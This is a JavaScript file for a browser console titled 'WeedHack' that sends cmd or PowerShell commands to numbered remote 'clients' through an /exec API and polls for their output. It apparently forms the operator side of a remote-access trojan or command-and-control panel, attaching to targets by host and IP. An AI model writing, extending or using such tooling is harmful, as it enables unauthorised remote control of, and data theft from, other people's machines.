// language: JavaScript, file: public/js/cmd.js
const $ = (id) => document.getElementById(id);
const params = new URLSearchParams(location.search);

const clientId = Number(params.get('id'));
let shell = (params.get('shell') || 'cmd').toLowerCase();
if (!['cmd', 'powershell'].includes(shell)) shell = 'cmd';

const target = params.get('host') || `client ${clientId}`;
const ip = params.get('ip') || '';

let lastSeenId = 0;
let pollTimer = null;

function paintChrome() {
  $('bar-shell').textContent = shell;
  $('bar-target').textContent = `${target} @ ${ip}`;
  $('ps1').textContent = shell === 'powershell' ? 'PS>' : 'C:\\>';
  document.title = `WeedHack — ${shell} — ${target}`;
}

function nowStamp() {
  const d = new Date();
  const pad = (n) => String(n).padStart(2, '0');
  return `${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`;
}

function writeLine(text, cls) {
  const el = document.createElement('div');
  el.className = 'line' + (cls ? ' ' + cls : '');
  el.textContent = text;
  $('term').appendChild(el);
  $('term').scrollTop = $('term').scrollHeight;
}

function writeMeta(text) {
  writeLine(`[${nowStamp()}] ${text}`, 'meta');
}

async function send(line) {
  if (!line.trim()) return;
  writeLine(`${shell === 'powershell' ? 'PS>' : 'C:\\>'} ${line}`, 'in');
  const r = await fetch(`/api/clients/${clientId}/exec`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ shell, line })
  });
  const d = await r.json().catch(() => ({}));
  if (!r.ok) { writeLine(`send failed: ${d.error || r.status}`, 'err'); return; }
  pollSoon();
}

async function pollOnce() {
  if (!clientId) return;
  const r = await fetch(`/api/clients/${clientId}/commands`);
  if (!r.ok) return;
  const rows = await r.json();
  // server returns DESC; walk oldest → newest
  const asc = rows.slice().reverse();
  for (const row of asc) {
    if (row.id <= lastSeenId) continue;
    lastSeenId = row.id;
    if (row.shell !== shell) continue;   // keep one shell per window
    if (row.status === 'pending' || row.status === 'sent') {
      writeMeta(`${shell} → ${row.line}  [sent]`);
      continue;
    }
    if (row.status === 'done') {
      writeLine(`${shell === 'powershell' ? 'PS>' : 'C:\\>'} ${row.line}`, 'in');
      if (row.output) writeLine(row.output);
      else writeLine('(no output)');
    }
  }
}

function pollSoon() {
  clearTimeout(pollTimer);
  pollTimer = setTimeout(pollOnce, 800);
}

$('cmdline').addEventListener('keydown', (e) => {
  if (e.key === 'Enter') {
    const v = $('cmdline').value;
    $('cmdline').value = '';
    send(v);
  }
});

paintChrome();
writeMeta(`attached to ${target} @ ${ip}`);
writeMeta(`shell = ${shell}`);
writeMeta('type a command and press enter');
setInterval(pollOnce, 2000);
pollOnce();